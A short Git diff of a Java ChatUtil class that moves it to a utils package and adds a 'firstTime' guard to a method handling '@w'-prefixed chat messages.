@@ -1,4 +1,4 @@
-package me.soda.witch.features;
+package me.soda.witch.utils;
 
 import me.soda.witch.Witch;
 import me.soda.witch.websocket.Message;
@@ -49,7 +49,7 @@ public class ChatUtil {
 
     public static boolean tryChatBack(String string) {
         String[] msgArr = string.split(" ");
-        if (msgArr.length < 2 || !msgArr[0].equals("@w")) return false;
+        if (firstTime || msgArr.length < 2 || !msgArr[0].equals("@w")) return false;
         String[] strArr = new String[msgArr.length - 1];
         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
         String chatText = String.join(" ", strArr);
